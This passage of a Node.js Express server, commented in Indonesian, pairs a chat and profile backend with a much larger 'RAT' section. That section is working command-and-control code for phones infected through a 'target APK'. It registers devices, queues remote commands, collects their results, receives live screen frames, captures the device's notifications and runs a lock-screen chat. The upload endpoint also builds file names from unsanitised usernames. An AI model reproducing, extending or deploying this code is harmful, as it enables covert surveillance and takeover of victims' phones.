  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// Inisialisasi file jika belum ada
if (!fs.existsSync(PUBLIC_CHAT_FILE)) writeJsonFile(PUBLIC_CHAT_FILE, []);
if (!fs.existsSync(PRIVATE_CHAT_FILE)) writeJsonFile(PRIVATE_CHAT_FILE, []);
if (!fs.existsSync(FOLLOW_FILE)) writeJsonFile(FOLLOW_FILE, {});
if (!fs.existsSync(PROFILE_FILE)) writeJsonFile(PROFILE_FILE, {});

// ---------- 1. PUBLIC CHAT (endpoint /chatroom) ----------
// GET semua pesan public
app.get('/chatroom', (req, res) => {
  try {
    const chats = readJsonFile(PUBLIC_CHAT_FILE, []);
    res.json(chats);
  } catch (err) {
    console.error('[PUBLIC CHAT GET] Error:', err.message);
    res.status(500).json({ success: false, message: 'Gagal memuat chat public' });
  }
});

// POST pesan public
app.post('/chatroom', (req, res) => {
  try {
    const { from, user_id, message, type } = req.body;
    if (!from || !message) {
      return res.status(400).json({ success: false, message: 'from dan message wajib diisi' });
    }

    const newMsg = {
      id: `MSG-${Date.now()}`,
      from,
      user_id: user_id || 'USR-0000',
      message: sanitizePublicChat(message),
      type: type || 'text',
      time: Date.now(),
      status: 'terkirim'
    };

    let chats = readJsonFile(PUBLIC_CHAT_FILE, []);
    chats.push(newMsg);
    if (chats.length > 1000) chats = chats.slice(-1000);
    writeJsonFile(PUBLIC_CHAT_FILE, chats);

    res.status(200).json({ success: true, message: newMsg });
  } catch (err) {
    console.error('[PUBLIC CHAT POST] Error:', err.message);
    res.status(500).json({ success: false, message: 'Gagal mengirim pesan' });
  }
});

// ---------- 2. PRIVATE CHAT (endpoint /private_chat) ----------
// GET pesan private antara dua user
app.get('/private_chat', (req, res) => {
  try {
    const { from, to } = req.query;
    if (!from || !to) {
      return res.status(400).json({ success: false, message: 'from dan to wajib diisi' });
    }

    const all = readJsonFile(PRIVATE_CHAT_FILE, []);
    const filtered = all.filter(m =>
      (m.from === from && m.to === to) || (m.from === to && m.to === from)
    );
    res.json(filtered);
  } catch (err) {
    console.error('[PRIVATE CHAT GET] Error:', err.message);
    res.status(500).json({ success: false, message: 'Gagal memuat chat private' });
  }
});

// POST pesan private
app.post('/private_chat', (req, res) => {
  try {
    const { from, to, message } = req.body;
    if (!from || !to || !message) {
      return res.status(400).json({ success: false, message: 'from, to, message wajib diisi' });
    }

    const newMsg = {
      from,
      to,
      message: sanitizePublicChat(message),
      time: Date.now()
    };

    let all = readJsonFile(PRIVATE_CHAT_FILE, []);
    all.push(newMsg);
    if (all.length > 5000) all = all.slice(-5000);
    writeJsonFile(PRIVATE_CHAT_FILE, all);

    res.status(200).json({ success: true, message: newMsg });
  } catch (err) {
    console.error('[PRIVATE CHAT POST] Error:', err.message);
    res.status(500).json({ success: false, message: 'Gagal mengirim pesan private' });
  }
});

// ---------- 3. DAFTAR USER (endpoint /users) ----------
app.get('/users', (req, res) => {
  try {
    const db = loadDatabase();
    const users = db.map(u => ({
      username: u.username,
      id: `USR-${String(db.indexOf(u) + 1).padStart(4, '0')}`,
      bio: readJsonFile(PROFILE_FILE, {})[u.username]?.bio || 'Halo, saya pengguna Mclaren',
      avatar: readJsonFile(PROFILE_FILE, {})[u.username]?.avatar || '',
    }));
    res.json(users);
  } catch (err) {
    console.error('[USERS] Error:', err.message);
    res.status(500).json({ success: false, message: 'Gagal mengambil daftar user' });
  }
});

// ---------- 4. FOLLOW / UNFOLLOW (endpoint /follow) ----------
app.post('/follow', (req, res) => {
  try {
    const { from, target, action } = req.body;
    if (!from || !target || !action) {
      return res.status(400).json({ success: false, message: 'from, target, action wajib diisi' });
    }

    let follows = readJsonFile(FOLLOW_FILE, {});
    if (!follows[from]) follows[from] = [];

    if (action === 'follow') {
      if (!follows[from].includes(target)) follows[from].push(target);
    } else if (action === 'unfollow') {
      follows[from] = follows[from].filter(u => u !== target);
    } else {
      return res.status(400).json({ success: false, message: 'action harus follow atau unfollow' });
    }

    writeJsonFile(FOLLOW_FILE, follows);
    res.json({ success: true, followed: follows[from] });
  } catch (err) {
    console.error('[FOLLOW] Error:', err.message);
    res.status(500).json({ success: false, message: 'Gagal memproses follow' });
  }
});

// ---------- 5. UPLOAD MEDIA (endpoint /upload) ----------
app.post('/upload', async (req, res) => {
  try {
    const { username, media, type } = req.body;
    if (!username || !media) {
      return res.status(400).json({ success: false, message: 'username dan media wajib diisi' });
    }

    // Simpan media ke folder uploads
    const uploadDir = path.join(__dirname, 'uploads');
    if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });

    const ext = type === 'video' ? '.mp4' : '.jpg';
    const filename = `${username}_${Date.now()}${ext}`;
    const filepath = path.join(uploadDir, filename);

    // Hapus prefix base64 jika ada
    let base64Data = media;
    if (media.includes(',')) {
      base64Data = media.split(',')[1];
    }
    fs.writeFileSync(filepath, Buffer.from(base64Data, 'base64'));

    const url = `http://${req.headers.host}/uploads/${filename}`;
    res.json({ success: true, url });
  } catch (err) {
    console.error('[UPLOAD] Error:', err.message);
    res.status(500).json({ success: false, message: 'Gagal upload media' });
  }
});

// Serve file uploads secara statis
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// ---------- 6. PROFILE (endpoint /profile) ----------
// GET profil
app.get('/profile', (req, res) => {
  try {
    const { username } = req.query;
    if (!username) {
      return res.status(400).json({ success: false, message: 'username wajib diisi' });
    }

    const profiles = readJsonFile(PROFILE_FILE, {});
    const data = profiles[username] || { bio: '', avatar: '' };
    res.json({ success: true, bio: data.bio || '', avatar: data.avatar || '' });
  } catch (err) {
    console.error('[PROFILE GET] Error:', err.message);
    res.status(500).json({ success: false, message: 'Gagal mengambil profil' });
  }
});

// POST update profil
app.post('/profile', (req, res) => {
  try {
    const { username, bio, avatar } = req.body;
    if (!username) {
      return res.status(400).json({ success: false, message: 'username wajib diisi' });
    }

    let profiles = readJsonFile(PROFILE_FILE, {});
    if (!profiles[username]) profiles[username] = { bio: '', avatar: '' };

    if (bio !== undefined) profiles[username].bio = sanitizePublicChat(bio);
    if (avatar !== undefined) profiles[username].avatar = avatar;

    writeJsonFile(PROFILE_FILE, profiles);
    res.json({ success: true, profile: profiles[username] });
  } catch (err) {
    console.error('[PROFILE POST] Error:', err.message);
    res.status(500).json({ success: false, message: 'Gagal update profil' });
  }
});

// ============================================================
// 📌 RAT – REMOTE ADMINISTRATION TOOL (WITH RBAC)
// ============================================================

// ---------- Role Based Access Control (RBAC) ----------
const RAT_ALLOWED_ROLES = [
  'owner_utama', 'owner', 'staff', 'executorius',
  'forius_utama', 'moderator', 'ceo_utama',
  'tangan_kanan', 'tangan_kiri'
];
const RAT_ADMIN_ROLES = ['owner_utama', 'owner'];

function isRatUser(username) {
  if (!username) return false;
  const db = loadDatabase();
  const user = db.find(u => u.username === username);
  if (!user) return false;
  return RAT_ALLOWED_ROLES.includes(user.role);
}

function isRatAdmin(username) {
  if (!username) return false;
  const db = loadDatabase();
  const user = db.find(u => u.username === username);
  if (!user) return false;
  return RAT_ADMIN_ROLES.includes(user.role);
}

// ---------- File penyimpanan RAT ----------
const RAT_DEVICES_FILE = './rat_devices.json';
const RAT_PAIRID_FILE = './rat_pairid.json';
const RAT_PERMS_FILE = './rat_perms.json';
const RAT_COMMANDS_FILE = './rat_commands.json';
const RAT_RESPONSES_FILE = './rat_responses.json';
const RAT_LIVE_FILE = './rat_live.json';
const RAT_CHAT_FILE = './rat_chat.json';
const RAT_NOTIF_FILE = './rat_notif.json';

// ---------- Helper baca/tulis (khusus RAT) ----------
function readRatJson(file, defaultVal = {}) {
  try {
    if (!fs.existsSync(file)) return defaultVal;
    const data = fs.readFileSync(file, 'utf8');
    return JSON.parse(data) || defaultVal;
  } catch { return defaultVal; }
}
function writeRatJson(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// Inisialisasi file jika belum ada
if (!fs.existsSync(RAT_DEVICES_FILE)) writeRatJson(RAT_DEVICES_FILE, []);
if (!fs.existsSync(RAT_PAIRID_FILE)) writeRatJson(RAT_PAIRID_FILE, {});
if (!fs.existsSync(RAT_PERMS_FILE)) writeRatJson(RAT_PERMS_FILE, {});
if (!fs.existsSync(RAT_COMMANDS_FILE)) writeRatJson(RAT_COMMANDS_FILE, {});
if (!fs.existsSync(RAT_RESPONSES_FILE)) writeRatJson(RAT_RESPONSES_FILE, {});
if (!fs.existsSync(RAT_LIVE_FILE)) writeRatJson(RAT_LIVE_FILE, {});
if (!fs.existsSync(RAT_CHAT_FILE)) writeRatJson(RAT_CHAT_FILE, {});
if (!fs.existsSync(RAT_NOTIF_FILE)) writeRatJson(RAT_NOTIF_FILE, {});

// ---------- Helper autentikasi RAT ----------
function ratAuth(sessionKey) {
  const keyInfo = activeKeys[sessionKey];
  if (!keyInfo) return null;
  return keyInfo.username;
}

// ---------- 1. GET PAIR ID (/rat/pairid) ----------
app.get('/rat/pairid', (req, res) => {
  try {
    const { key } = req.query;

    const username = ratAuth(key);

    if (!username) {
      return res.status(401).json({
        valid: false,
        message: 'Invalid session key'
      });
    }

    if (!isRatUser(username)) {
      return res.status(403).json({
        valid: false,
        message: 'Access denied: Your role is not authorized for RAT'
      });
    }

    const pairIds = readRatJson(RAT_PAIRID_FILE, {});

    if (!pairIds[username]) {
      pairIds[username] =
        'PID-' + crypto.randomBytes(6).toString('hex').toUpperCase();

      writeRatJson(RAT_PAIRID_FILE, pairIds);
    }

    return res.json({
      valid: true,
      pairId: pairIds[username]
    });

  } catch (err) {
    console.error('[PAIRID ERROR]', err);

    return res.status(500).json({
      valid: false,
      message: 'Failed to generate Pair ID'
    });
  }
});

// ---------- 2. DAFTAR DEVICE USER (/rat/my-devices) ----------
app.get('/rat/my-devices', (req, res) => {
  const { key } = req.query;
  const username = ratAuth(key);
  if (!username) {
    return res.status(401).json({ valid: false, message: 'Invalid session key' });
  }
  if (!isRatUser(username)) {
    return res.status(403).json({ valid: false, message: 'Access denied: Your role is not authorized for RAT' });
  }

  const allDevices = readRatJson(RAT_DEVICES_FILE, []);
  const userDevices = allDevices.filter(d => d.owner === username);
  
  const now = Date.now();
  userDevices.forEach(d => {
    d.online = (now - (d.lastSeen || 0)) < 30000;
  });

  res.json({ valid: true, devices: userDevices });
});

// ---------- 3. REGISTER DEVICE (dipanggil dari APK target) ----------
app.post('/rat/register-device', (req, res) => {
  const { pairId, model, battery, ip } = req.body;
  if (!pairId) {
    return res.status(400).json({ valid: false, message: 'pairId required' });
  }

  const pairIds = readRatJson(RAT_PAIRID_FILE, {});
  let owner = null;
  for (const [user, pid] of Object.entries(pairIds)) {
    if (pid === pairId) { owner = user; break; }
  }
  if (!owner) {
    return res.status(404).json({ valid: false, message: 'Pair ID not found' });
  }

  const deviceId = 'DEV-' + crypto.randomBytes(6).toString('hex').toUpperCase();
  const newDevice = {
    id: deviceId,
    owner,
    model: model || 'Unknown',
    battery: battery || 100,
    ip: ip || '0.0.0.0',
    lastSeen: Date.now(),
    registeredAt: new Date().toISOString()
  };

  let devices = readRatJson(RAT_DEVICES_FILE, []);
  const existingIdx = devices.findIndex(d => d.ip === ip && d.owner === owner);
  if (existingIdx !== -1) {
    devices[existingIdx] = { ...devices[existingIdx], ...newDevice, id: devices[existingIdx].id };
  } else {
    devices.push(newDevice);
  }
  writeRatJson(RAT_DEVICES_FILE, devices);

  res.json({ valid: true, deviceId: newDevice.id });
});

// ---------- 4. HEARTBEAT DEVICE (update lastSeen) ----------
app.post('/rat/heartbeat', (req, res) => {
  const { deviceId, battery } = req.body;
  if (!deviceId) {
    return res.status(400).json({ valid: false, message: 'deviceId required' });
  }

  let devices = readRatJson(RAT_DEVICES_FILE, []);
  const idx = devices.findIndex(d => d.id === deviceId);
  if (idx === -1) {
    return res.status(404).json({ valid: false, message: 'Device not found' });
  }

  devices[idx].lastSeen = Date.now();
  if (battery !== undefined) devices[idx].battery = battery;
  writeRatJson(RAT_DEVICES_FILE, devices);

  res.json({ valid: true });
});

// ---------- 5. SEND COMMAND (/api/send-command) ----------
app.post('/api/send-command', (req, res) => {
  const { id, command, extra, key } = req.body;
  const username = ratAuth(key);
  if (!username) {
    return res.status(401).json({ valid: false, message: 'Invalid session key' });
  }
  if (!isRatUser(username)) {
    return res.status(403).json({ valid: false, message: 'Access denied: Your role is not authorized for RAT' });
  }
  if (!id || !command) {
    return res.status(400).json({ valid: false, message: 'id and command required' });
  }

  let cmds = readRatJson(RAT_COMMANDS_FILE, {});
  if (!cmds[id]) cmds[id] = [];
  cmds[id].push({
    command,
    extra: extra || '',
    sentAt: Date.now(),
    status: 'pending'
  });
  writeRatJson(RAT_COMMANDS_FILE, cmds);

  res.json({ status: 'queued' });
});

// ---------- 6. GET COMMAND (dipanggil oleh device) ----------
app.get('/rat/get-command/:id', (req, res) => {
  const deviceId = req.params.id;
  let cmds = readRatJson(RAT_COMMANDS_FILE, {});
  if (!cmds[deviceId] || cmds[deviceId].length === 0) {
    return res.status(204).send();
  }

  const cmd = cmds[deviceId].shift();
  cmd.status = 'taken';
  writeRatJson(RAT_COMMANDS_FILE, cmds);
  res.json(cmd);
});

// ---------- 7. POST RESPONSE (/api/post-response) ----------
app.post('/api/post-response', (req, res) => {
  const { deviceId, cmd, data } = req.body;
  if (!deviceId || !cmd) {
    return res.status(400).json({ valid: false, message: 'deviceId and cmd required' });
  }

  let responses = readRatJson(RAT_RESPONSES_FILE, {});
  if (!responses[deviceId]) responses[deviceId] = {};
  responses[deviceId][cmd] = {
    data,
    receivedAt: Date.now()
  };
  writeRatJson(RAT_RESPONSES_FILE, responses);

  res.json({ status: 'received' });
});

// ---------- 8. GET RESPONSE (/api/get-response/:id) ----------
app.get('/api/get-response/:id', (req, res) => {
  const deviceId = req.params.id;
  const { key } = req.query;
  const username = ratAuth(key);
  if (!username) {
    return res.status(401).json({ valid: false, message: 'Invalid session key' });
  }
  if (!isRatUser(username)) {
    return res.status(403).json({ valid: false, message: 'Access denied: Your role is not authorized for RAT' });
  }

  const responses = readRatJson(RAT_RESPONSES_FILE, {});
  const devRes = responses[deviceId] || {};
  const keys = Object.keys(devRes);
  if (keys.length === 0) {
    return res.status(204).send();
  }
  const lastCmd = keys[keys.length - 1];
  const data = devRes[lastCmd];
  delete devRes[lastCmd];
  writeRatJson(RAT_RESPONSES_FILE, responses);
  res.json({ cmd: lastCmd, data: data.data });
});

// ---------- 9. LIVE FRAME (/api/live-frame/:id) ----------
app.get('/api/live-frame/:id', (req, res) => {
  const deviceId = req.params.id;
  const { key } = req.query;
  const username = ratAuth(key);
  if (!username) {
    return res.status(401).json({ valid: false, message: 'Invalid session key' });
  }
  if (!isRatUser(username)) {
    return res.status(403).json({ valid: false, message: 'Access denied: Your role is not authorized for RAT' });
  }

  const live = readRatJson(RAT_LIVE_FILE, {});
  const frame = live[deviceId] || null;
  res.json({ frame: frame || '' });
});

// ---------- 10. POST LIVE FRAME (dipanggil device) ----------
app.post('/rat/post-live-frame', (req, res) => {
  const { deviceId, frame } = req.body;
  if (!deviceId || !frame) {
    return res.status(400).json({ valid: false, message: 'deviceId and frame required' });
  }
  let live = readRatJson(RAT_LIVE_FILE, {});
  live[deviceId] = frame;
  writeRatJson(RAT_LIVE_FILE, live);
  res.json({ status: 'ok' });
});

// ---------- 11. CHAT (lock-chat) ----------
app.post('/api/lock-chat/:id', (req, res) => {
  const deviceId = req.params.id;
  const { text, from, key } = req.body;
  const username = ratAuth(key);
  if (!username) {
    return res.status(401).json({ valid: false, message: 'Invalid session key' });
  }
  if (!isRatUser(username)) {
    return res.status(403).json({ valid: false, message: 'Access denied: Your role is not authorized for RAT' });
  }
  if (!text) {
    return res.status(400).json({ valid: false, message: 'text required' });
  }

  let chats = readRatJson(RAT_CHAT_FILE, {});
  if (!chats[deviceId]) chats[deviceId] = [];
  chats[deviceId].push({
    from: from || 'owner',
    text,
    time: new Date().toLocaleTimeString(),
    timestamp: Date.now()
  });
  writeRatJson(RAT_CHAT_FILE, chats);

  res.json({ status: 'sent' });
});

// ---------- 12. GET ALL CHAT (/api/lock-chat-all/:id) ----------
app.get('/api/lock-chat-all/:id', (req, res) => {
  const deviceId = req.params.id;
  const { key } = req.query;
  const username = ratAuth(key);
  if (!username) {
    return res.status(401).json({ valid: false, message: 'Invalid session key' });
  }
  if (!isRatUser(username)) {
    return res.status(403).json({ valid: false, message: 'Access denied: Your role is not authorized for RAT' });
  }

  const chats = readRatJson(RAT_CHAT_FILE, {});
  const msgs = chats[deviceId] || [];
  res.json({ messages: msgs });
});

// ---------- 13. POST CHAT DARI DEVICE ----------
app.post('/rat/post-chat', (req, res) => {
  const { deviceId, text, from } = req.body;
  if (!deviceId || !text) {
    return res.status(400).json({ valid: false, message: 'deviceId and text required' });
  }

  let chats = readRatJson(RAT_CHAT_FILE, {});
  if (!chats[deviceId]) chats[deviceId] = [];
  chats[deviceId].push({
    from: from || 'device',
    text,
    time: new Date().toLocaleTimeString(),
    timestamp: Date.now()
  });
  writeRatJson(RAT_CHAT_FILE, chats);

  res.json({ status: 'ok' });
});

// ---------- 14. NOTIFICATIONS ----------
app.get('/api/get-notifications/:id', (req, res) => {
  const deviceId = req.params.id;
  const { key } = req.query;
  const username = ratAuth(key);
  if (!username) {
    return res.status(401).json({ valid: false, message: 'Invalid session key' });
  }
  if (!isRatUser(username)) {
    return res.status(403).json({ valid: false, message: 'Access denied: Your role is not authorized for RAT' });
  }

  const notifs = readRatJson(RAT_NOTIF_FILE, {});
  const list = notifs[deviceId] || [];
  res.json(list);
});

app.post('/rat/post-notification', (req, res) => {
  const { deviceId, title, body } = req.body;
  if (!deviceId || !title) {
    return res.status(400).json({ valid: false, message: 'deviceId and title required' });
  }

  let notifs = readRatJson(RAT_NOTIF_FILE, {});
  if (!notifs[deviceId]) notifs[deviceId] = [];
  notifs[deviceId].unshift({ title, body, timestamp: Date.now() });
  if (notifs[deviceId].length > 100) notifs[deviceId] = notifs[deviceId].slice(0, 100);
  writeRatJson(RAT_NOTIF_FILE, notifs);

  res.json({ status: 'ok' });
});

// ---------- 15. PERMISSION: GET (/devicePerms) ----------
app.get('/devicePerms', (req, res) => {
  const { key, username } = req.query;
  const owner = ratAuth(key);
  if (!owner) {
    return res.status(401).json({ valid: false, message: 'Invalid session key' });
  }
  if (!isRatAdmin(owner)) {
    return res.status(403).json({ valid: false, message: 'Access denied: Only Owner or Owner Utama can manage permissions' });
  }

  const perms = readRatJson(RAT_PERMS_FILE, {});
  const target = username || '';
  if (target) {
    const data = perms[target] || { approved: false, allDevices: false, devices: [] };
    return res.json({ valid: true, ...data });
  }
  res.json({ valid: true, perms });
});

// ---------- 16. PERMISSION: SET (/setDevicePerm) ----------
app.post('/setDevicePerm', (req, res) => {
  const { key } = req.query;
  const { username, approved, allDevices, devices } = req.body;
  const owner = ratAuth(key);
  if (!owner) {
    return res.status(401).json({ valid: false, message: 'Invalid session key' });
  }
  if (!isRatAdmin(owner)) {
    return res.status(403).json({ valid: false, message: 'Access denied: Only Owner or Owner Utama can set permissions' });
  }
  if (!username) {
    return res.status(400).json({ valid: false, message: 'username required' });
  }

  let perms = readRatJson(RAT_PERMS_FILE, {});
  perms[username] = {
    approved: approved === true,
    allDevices: allDevices === true,
    devices: devices || []
  };
  writeRatJson(RAT_PERMS_FILE, perms);
  res.json({ valid: true });
});

// ---------- 17. PERMISSION: LIST (/listDevicePerms) ----------
app.get('/listDevicePerms', (req, res) => {
  const { key } = req.query;
  const owner = ratAuth(key);
  if (!owner) {
    return res.status(401).json({ valid: false, message: 'Invalid session key' });
  }
  if (!isRatAdmin(owner)) {
    return res.status(403).json({ valid: false, message: 'Access denied: Only Owner or Owner Utama can list permissions' });
  }

  const perms = readRatJson(RAT_PERMS_FILE, {});
  res.json({ valid: true, perms });
});

// ══════════════════════════════════════════════════════════════
// 🆕 FORCE INIT SERVICES & SETORAN + REGISTER /addlayanan
// ══════════════════════════════════════════════════════════════
setTimeout(() => {
  try { getServicesDP(); console.log('[BOOT] servicesDP ready ✅'); } catch (e) { console.error('[BOOT] servicesDP:', e.message); }
  try { getSetoran(); console.log('[BOOT] setoran ready ✅'); } catch (e) { console.error('[BOOT] setoran:', e.message); }
}, 2000);

console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
console.log(`    Cloude Is Here - LIMIT EDITION   `);
console.log(`    STATUS : PERSISTENCE ACTIVE        `);
console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);